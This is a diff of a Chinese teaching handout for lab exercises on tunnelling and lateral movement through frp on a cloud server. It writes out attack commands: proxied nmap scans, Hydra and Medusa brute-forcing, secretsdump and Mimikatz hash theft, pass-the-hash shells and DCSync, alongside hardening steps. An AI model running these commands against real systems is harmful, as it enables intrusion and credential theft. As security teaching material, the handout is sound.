 net view /domain
@@ -1498,9 +1325,9 @@ net view /domain
 net share
 # 预期：列出 C$、ADMIN$、IPC$ 等默认共享和自定义共享
 
-# 4. 查看远程主机的共享
-net view \\192.168.100.20
-# 预期：列出 SRV01 上可访问的共享资源
+# 4. 查看远程主机的共享（如果有其他内网主机）
+net view \\<其他主机IP>
+# 预期：列出远程主机上可访问的共享资源
 
 # 5. 查看本机运行的服务
 Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, StartType
@@ -1515,9 +1342,9 @@ Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize
 
 ### 实验8：Nmap内网扫描（通过frp隧道从Kali执行）
 
-> ⚠️ **前置条件**：完成实验4（frp隧道已建立），SOCKS5代理可用（192.168.10.10:10080）。
+> ⚠️ **前置条件**：完成实验1-3（frp隧道已建立），SOCKS5代理可用（`<ECS公网IP>:10080`）。
 >
-> **实验场景**：Kali 通过 frp SOCKS5 代理扫描 192.168.100.0/24 内网，发现主机、端口和服务。
+> **实验场景**：Kali 通过 frp SOCKS5 代理扫描 SRV02 本地网络中的服务。SOCKS5 代理从 SRV02 本地发起连接，因此可以访问 SRV02 所在网络中的其他主机。
 
 **第一步：配置proxychains**
 
@@ -1527,7 +1354,7 @@ sudo nano /etc/proxychains4.conf
 
 # 确保文件末尾有以下配置：
 # [ProxyList]
-# socks5 192.168.10.10 10080
+# socks5 <ECS公网IP> 10080
 
 # 注意：如果之前配置过 proxychains，先删除旧的代理配置行
 ```
@@ -1535,25 +1362,28 @@ sudo nano /etc/proxychains4.conf
 **第二步：主机发现**
 
 ```bash
-# 通过 SOCKS5 代理扫描内网存活主机
-proxychains nmap -sn 192.168.100.0/24
+# 通过 SOCKS5 代理扫描 SRV02 本地网络
+# SOCKS5 代理从 SRV02 本地发起连接，127.0.0.1 即 SRV02 自身
+proxychains nmap -sn 127.0.0.1
+
+# 如果 SRV02 处于 VMware NAT 网段中，可扫描该网段发现其他主机
+# 替换为实际的 VMware 网段地址
+proxychains nmap -sn <VMware网段>/24
 
 # 预期输出：
-# Nmap scan report for 192.168.100.20
-# Host is up (0.xxxs latency).
-# Nmap scan report for 192.168.100.30
+# Nmap scan report for 127.0.0.1
 # Host is up (0.xxxs latency).
 
 # 注意：proxychains 下的 nmap 会比较慢（流量经过多层转发），请耐心等待
 ```
 
-> ⚠️ **预期结果**：发现 192.168.100.20（SRV01）和 192.168.100.30（SRV02）两台主机。如果只发现 SRV02（frp客户端所在主机），说明 SOCKS5 代理可能只转发到本机，需检查 frp 的 socks5 隧道配置。
+> ⚠️ **预期结果**：通过 SOCKS5 代理可以扫描到 SRV02 自身及同一网段中的其他主机。如果 SRV02 处于 VMware NAT 网段中，可能发现 VMware NAT 网关和其他虚拟机。
 
 **第三步：端口扫描与服务识别**
 
 ```bash
-# 扫描 SRV02 的关键端口
-proxychains nmap -sT -p 21,22,80,135,139,445,3389,5985 192.168.100.30
+# 扫描 SRV02 的关键端口（SOCKS5代理从SRV02本地发起连接，127.0.0.1即SRV02）
+proxychains nmap -sT -p 21,22,80,135,139,445,3389,5985 127.0.0.1
 
 # 预期输出示例：
 # PORT     STATE  SERVICE
@@ -1565,10 +1395,10 @@ proxychains nmap -sT -p 21,22,80,135,139,445,3389,5985 192.168.100.30
 # 5985/tcp open   wsman
 
 # 服务版本探测
-proxychains nmap -sT -sV -p 80,445,3389,5985 192.168.100.30
+proxychains nmap -sT -sV -p 80,445,3389,5985 127.0.0.1
 
 # 操作系统探测
-proxychains nmap -sT -O 192.168.100.30
+proxychains nmap -sT -O 127.0.0.1
 ```
 
 > 💡 **proxychains 下的 nmap 限制**：
@@ -1580,10 +1410,10 @@ proxychains nmap -sT -O 192.168.100.30
 
 ```bash
 # 扫描 SMB 相关漏洞
-proxychains nmap -sT --script smb-vuln* -p 445 192.168.100.30
+proxychains nmap -sT --script smb-vuln* -p 445 127.0.0.1
 
 # 扫描 SMB 共享和用户
-proxychains nmap -sT --script smb-enum-shares,smb-enum-users -p 445 192.168.100.30
+proxychains nmap -sT --script smb-enum-shares,smb-enum-users -p 445 127.0.0.1
 ```
 
 **第五步：通过frp直接扫描（不使用proxychains）**
@@ -1721,11 +1551,11 @@ qwerty
 EOF
 
 # 使用 Hydra 通过 frp 映射端口暴力破解 RDP
-hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://192.168.10.10 -s 10001 -t 4
+hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<ECS公网IP> -s 10001 -t 4
 
 # 预期输出示例：
-# [3389][rdp] host: 192.168.10.10   login: admin123   password: 123456
-# [3389][rdp] host: 192.168.10.10   login: testuser   password: P@ssw0rd
+# [3389][rdp] host: <ECS公网IP>   login: admin123   password: 123456
+# [3389][rdp] host: <ECS公网IP>   login: testuser   password: P@ssw0rd
 ```
 
 > ⚠️ **预期结果**：Hydra 成功破解出 `admin123:123456` 和 `testuser:P@ssw0rd` 两组弱口令。如果超时或连接失败，增加 `-w 10` 参数延长超时时间（frp 隧道有额外延迟）。
@@ -1734,7 +1564,7 @@ hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://192.168.10.10 -s 10001 -t 4
 
 ```bash
 # 使用 Medusa 通过 frp SMB 映射进行密码喷洒
-medusa -h 192.168.10.10 -u administrator -P /tmp/passwords.txt -M smbnt -n 10004
+medusa -h <ECS公网IP> -u administrator -P /tmp/passwords.txt -M smbnt -n 10004
 
 # 预期输出：如果 administrator 的密码在字典中，会显示 SUCCESS
 ```
@@ -1760,9 +1590,9 @@ which impacket-secretsdump impacket-wmiexec impacket-psexec nxc
 
 ```bash
 # 在 Kali 上使用 Impacket secretsdump 获取哈希
-# 推荐方式：通过 frp 的 SOCKS5 隧道访问 SRV02 内网真实地址（192.168.100.30:445）
-# 确认 /etc/proxychains4.conf 已配置：socks5 192.168.10.10 10080
-proxychains impacket-secretsdump administrator:'P@ssw0rd'@192.168.100.30
+# 推荐方式：通过 frp 的 SOCKS5 隧道访问 SRV02（127.0.0.1:445，因为 SOCKS5 代理从 SRV02 本地发起连接）
+# 确认 /etc/proxychains4.conf 已配置：socks5 <ECS公网IP> 10080
+proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1
 
 # 说明：许多 Impacket 脚本依赖 SMB/RPC 默认端口和动态端口，不建议只依赖单个 10004 端口映射。
 # 预期输出（部分）：
@@ -1777,7 +1607,7 @@ proxychains impacket-secretsdump administrator:'P@ssw0rd'@192.168.100.30
 
 ```bash
 # 通过 frp WinRM 映射连接 SRV02
-evil-winrm -i 192.168.10.10 -P 10003 -u administrator -p 'P@ssw0rd'
+evil-winrm -i <ECS公网IP> -P 10003 -u administrator -p 'P@ssw0rd'
 
 # 在 Evil-WinRM 会话中执行 Mimikatz 获取哈希
 # 方法一：使用内置的 Invoke-Mimikatz
@@ -1803,16 +1633,16 @@ upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
 
 # 方法一：NetExec（nxc，批量操作）
 # 通过 frp SMB 映射端口验证哈希有效性
-nxc smb 192.168.10.10 --port 10004 -u administrator -H '<NTLM_HASH>'
+nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 
 # 方法二：NetExec 使用 PtH 执行远程命令
-nxc smb 192.168.10.10 --port 10004 -u administrator -H '<NTLM_HASH>' -x "whoami"
+nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>' -x "whoami"
 
-# 方法三：Impacket wmiexec（交互式Shell，推荐走 SOCKS5 访问内网真实IP）
-proxychains impacket-wmiexec -hashes :'<NTLM_HASH>' administrator@192.168.100.30
+# 方法三：Impacket wmiexec（交互式Shell，推荐走 SOCKS5）
+proxychains impacket-wmiexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
 
-# 方法四：Impacket psexec（SYSTEM权限Shell，推荐走 SOCKS5 访问内网真实IP）
-proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@192.168.100.30
+# 方法四：Impacket psexec（SYSTEM权限Shell，推荐走 SOCKS5）
+proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
 ```
 
 > 💡 **PtH 的教学意义**：PtH 攻击说明密码哈希在 Windows 认证体系中等价于明文密码。防御措施包括：将高权限账户加入 Protected Users 组（禁止 NTLM 认证）、启用 Credential Guard（虚拟化保护凭据）、部署 SMB 签名（防止哈希被中继）。
@@ -1907,12 +1737,12 @@ Microsoft 推荐的 AD 管理权限分层模型：
 
 ### 实验12：内网安全加固
 
-> 本实验在 SRV01 和 SRV02 上实施一系列安全加固措施，然后验证加固效果。
+> 本实验在 SRV02 上实施安全加固措施，然后验证加固效果。
 
 **第一步：启用SMB签名（防御SMB中继攻击）**
 
 ```powershell
-# 在 SRV01 和 SRV02 上分别执行
+# 在 SRV02 上执行
 
 # 方法一：通过注册表启用 SMB 签名
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord
@@ -1953,27 +1783,28 @@ Get-ADGroupMember -Identity "Protected Users" | Select-Object Name, SamAccountNa
 **第三步：配置Windows防火墙限制横向移动**
 
 ```powershell
-# 在 SRV01 和 SRV02 上执行
+# 在 SRV02 上执行
 
 # 先确保防火墙已启用
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
 
 # 限制 RDP 来源（仅允许指定IP访问3389）
+# 将 RemoteAddress 替换为实际的管理端IP地址
 Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
 New-NetFirewallRule -DisplayName "RDP-Allow-Admin" -Direction Inbound `
   -Protocol TCP -LocalPort 3389 -Action Allow `
-  -RemoteAddress 192.168.100.20
+  -RemoteAddress <管理端IP>
 
 # 限制 WinRM 来源
 Disable-NetFirewallRule -DisplayGroup "Windows Remote Management"
 New-NetFirewallRule -DisplayName "WinRM-Allow-Admin" -Direction Inbound `
   -Protocol TCP -LocalPort 5985 -Action Allow `
-  -RemoteAddress 192.168.100.20
+  -RemoteAddress <管理端IP>
 
-# 限制 SMB 来源
+# 限制 SMB 来源（仅允许本地网段访问）
 New-NetFirewallRule -DisplayName "SMB-Restrict" -Direction Inbound `
   -Protocol TCP -LocalPort 445 -Action Allow `
-  -RemoteAddress 192.168.100.0/24
+  -RemoteAddress <本地网段>/24
 
 # 阻止 frp 等内网穿透工具的出站连接（基于端口）
 New-NetFirewallRule -DisplayName "Block-FRP-Outbound" -Direction Outbound `
@@ -2023,7 +1854,7 @@ net share ADMIN$ /delete
 # 在 Kali 上验证
 
 # 1. 验证 PtH 被阻止（Protected Users 效果）
-nxc smb 192.168.10.10 --port 10004 -u administrator -H '<NTLM_HASH>'
+nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 # 预期：STATUS_LOGON_TYPE_NOT_GRANTED 或 STATUS_ACCESS_DENIED
 
 # 2. 验证黄金票据失效
@@ -2046,23 +1877,26 @@ nxc smb 192.168.10.10 --port 10004 -u administrator -H '<NTLM_HASH>'
 
 ---
 
-# ✅ Kali 2025.04 / Windows Server 2025 课前检查清单
+# ✅ 阿里云 ECS / Windows Server 2022 课前检查清单
 
 正式上课或验收前，建议教师先按下列项目完成一次预演：
 
 | 检查项 | 命令/操作 | 通过标准 |
 | --- | --- | --- |
-| Kali 工具检查 | `which nmap proxychains4 evil-winrm nxc impacket-secretsdump impacket-wmiexec` | 所有关键工具能找到路径 |
+| ECS 安全组 | 阿里云控制台 → ECS → 安全组 | 22、7000、7500、10000-20000 端口已放行 |
+| ECS SSH 连接 | `ssh root@<ECS公网IP>` | 可正常登录 Ubuntu 系统 |
+| frps 安装 | ECS 上执行 `ls /opt/frp/frps` | frps 可执行文件存在 |
+| frps 启动 | ECS 上运行 `ss -tlnp \| grep -E "7000\|7500"` | frps 监听 7000/7500 |
+| frp Dashboard | 浏览器访问 `http://<ECS公网IP>:7500` | 显示 frp 管理面板 |
+| SRV02 本地虚拟机 | 本地 VMware 中启动 Windows Server，确认可访问互联网 | 可正常登录，可 `ping <ECS公网IP>` 通 |
+| frpc 安装 | SRV02 上 `dir C:\frp\frpc.exe` | frpc.exe 存在 |
+| frpc 连接 | SRV02 运行 `frpc.exe -c frpc.toml` | 显示 "login to server success" |
+| 隧道验证 | Kali 上 `nmap -p 10001,10002 <ECS公网IP>` | 10001/10002 端口 open |
+| Kali 工具检查 | `which nmap proxychains4 evil-winrm nxc` | 所有关键工具能找到路径 |
 | NetExec 安装 | `sudo apt install -y netexec` | `nxc --help` 可正常显示帮助 |
 | Impacket 安装 | `sudo apt install -y impacket-scripts python3-impacket` | `impacket-secretsdump -h` 可正常显示帮助 |
-| SRV01 双网卡 | `Get-NetIPAddress -AddressFamily IPv4` | 同时存在 `192.168.10.20/24` 与 `192.168.100.20/24` |
-| SRV02 网关 | `ipconfig` | 默认网关为 `192.168.100.20` |
-| RRAS/NAT | `rrasmgmt.msc` | 公网接口为 NAT 公用接口，内网接口为专用接口 |
-| portproxy | `netsh interface portproxy show all` | 能看到 3389、8080、5985 等映射 |
-| frp | Kali 运行 `ss -tlnp | grep -E "7000|7500"` | frps 监听 7000/7500，frpc 登录成功 |
-| SOCKS5 代理 | `proxychains nmap -sT -p 445 192.168.100.30` | 可以经隧道扫描 SRV02 内网端口 |
 
-> 兼容性结论：使用 Kali Linux 2025.04 与 Windows Server 2025 可以完成本讲义实验；但课堂命令应以 NetExec（`nxc`）替代原 CrackMapExec 写法，Impacket 优先使用 `impacket-*` 命令，Windows NAT 配置优先采用 RRAS。
+> 兼容性结论：使用阿里云 ECS（Ubuntu）部署 frps 服务端，本地虚拟机（Windows Server 2022）运行 frpc 客户端，可完成本讲义全部实验。课堂命令应以 NetExec（`nxc`）替代原 CrackMapExec 写法，Impacket 优先使用 `impacket-*` 命令。**实验结束后务必释放 ECS 实例，避免持续扣费。**
 
 ---
 
@@ -2072,21 +1906,17 @@ nxc smb 192.168.10.10 --port 10004 -u administrator -H '<NTLM_HASH>'
 
 | 操作 | 命令/方法 |
 | --- | --- |
-| 查看网卡信息 | `Get-NetAdapter` / `ipconfig /all` |
-| 配置静态IP | `New-NetIPAddress -InterfaceAlias "以太网" -IPAddress x.x.x.x -PrefixLength 24` |
-| 启用IP转发 | `Set-ItemProperty "HKLM:...\Tcpip\Parameters" "IPEnableRouter" 1` |
-| 端口映射（创建） | `netsh interface portproxy add v4tov4 listenport=X connectport=Y connectaddress=Z` |
-| 端口映射（查看） | `netsh interface portproxy show all` |
-| 端口映射（删除） | `netsh interface portproxy delete v4tov4 listenport=X` |
-| 端口映射（重置） | `netsh interface portproxy reset` |
-| frp服务端启动 | `./frps -c frps.toml` |
-| frp客户端启动 | `frpc.exe -c frpc.toml` |
-| SSH本地端口转发 | `ssh -L 本地端口:目标IP:目标端口 用户@跳板IP -N -f` |
-| SSH动态端口转发 | `ssh -D 1080 用户@跳板IP -N -f`（SOCKS5代理） |
+| 阿里云安全组配置 | ECS 控制台 → 安全组 → 添加入站规则（22/7000/7500/10000-20000） |
+| ECS SSH 连接 | `ssh root@<ECS公网IP>` |
+| frp服务端启动 | `./frps -c frps.toml`（在阿里云 ECS 上） |
+| frp客户端启动 | `frpc.exe -c frpc.toml`（在本地虚拟机 SRV02 上） |
+| frp Dashboard | 浏览器访问 `http://<ECS公网IP>:7500` |
+| SSH远程端口转发 | `ssh -R 远程端口:本地IP:本地端口 root@<ECS公网IP> -N -f` |
+| SSH动态端口转发 | `ssh -D 1080 root@<ECS公网IP> -N -f`（SOCKS5代理） |
 | Nmap经代理扫描 | `proxychains nmap -sT -p 端口 目标IP` |
-| RDP暴力破解 | `hydra -L users.txt -P pwds.txt rdp://IP -s 端口` |
+| RDP暴力破解 | `hydra -L users.txt -P pwds.txt rdp://<ECS公网IP> -s 端口` |
 | 获取NTLM哈希 | Evil-WinRM + `Invoke-Mimikatz` / `proxychains impacket-secretsdump` |
-| Pass-the-Hash | `proxychains impacket-psexec -hashes :NTLM 用户@IP` / `proxychains impacket-wmiexec -hashes :NTLM 用户@IP` |
+| Pass-the-Hash | `proxychains impacket-psexec -hashes :NTLM 用户@127.0.0.1` |
 | DCSync导出域哈希 | `impacket-secretsdump 域/用户:密码@域控IP -just-dc-ntlm` |
 | 启用SMB签名 | `Set-ItemProperty "LanmanServer\Parameters" "RequireSecuritySignature" 1` |
 | Protected Users | `Add-ADGroupMember -Identity "Protected Users" -Members "用户名"` |
@@ -2096,9 +1926,8 @@ nxc smb 192.168.10.10 --port 10004 -u administrator -H '<NTLM_HASH>'
 
 | 问题 | 可能原因 | 解决方法 |
 | --- | --- | --- |
-| SRV02 无法 ping 通 Kali | SRV02 网关未指向 SRV01 | 在 SRV02 上配置默认网关为 192.168.100.20 |
-| 端口映射不生效 | SRV01 防火墙阻止入站连接 | 关闭 SRV01 防火墙或添加入站规则 |
-| frpc 连接 frps 失败 | Token 不一致或网络不通 | 检查 frpc.toml 和 frps.toml 中的 token 是否一致 |
+| ECS 安全组端口不通 | 安全组未放行对应端口 | 在阿里云控制台添加入站规则 |
+| frpc 连接 frps 失败 | Token 不一致、ECS 安全组未放行 7000、或 SRV02 无法上网 | 检查 token、安全组规则、SRV02 网络连通性 |
 | frp 隧道已建立但无法访问服务 | 本地服务未启动或 localIP/localPort 配置错误 | 确认目标服务已启动，检查 frpc.toml 中的 proxies 配置 |
 | proxychains nmap 超时 | SOCKS5 代理端口不正确或隧道断开 | 重新检查 frp SOCKS5 隧道状态，确认 proxychains 配置 |
 | Hydra 破解 RDP 超时 | frp 隧道延迟导致超时 | 增加超时参数 `-w 10`，或降低并发线程 `-t 1` |
@@ -2156,7 +1985,7 @@ nxc smb 192.168.10.10 --port 10004 -u administrator -H '<NTLM_HASH>'
 
 | 关联项目 | 关联内容 |
 | --- | --- |
-| **项目一·走进Windows服务器** | 项目一中配置的网络环境（NAT模式、IP配置）是本项目的基础；本项目在双网卡场景下深化了网络配置的理解 |
+| **项目一·走进Windows服务器** | 项目一中配置的网络环境（NAT模式、IP配置）是本项目的基础；本项目通过阿里云 ECS 部署 frp 服务端，深化了对网络穿透和隧道技术的理解 |
 | **项目四·IIS网站管理** | 项目四部署的 IIS Web 服务可作为内网穿透的映射目标（实验4的Web隧道），IIS 安全加固在内网环境中同样重要 |
 | **项目五·远程管理** | 项目五配置的 RDP 和 WinRM 服务在本项目中成为横向移动的主要通道——RDP 暴力破解（实验9）、WinRM 远程执行（实验10）均依赖这些服务 |
 | **项目六·域管理** | 项目六搭建的域环境为域级渗透提供基础；域用户凭据、krbtgt 等概念直接来自域管理知识 |
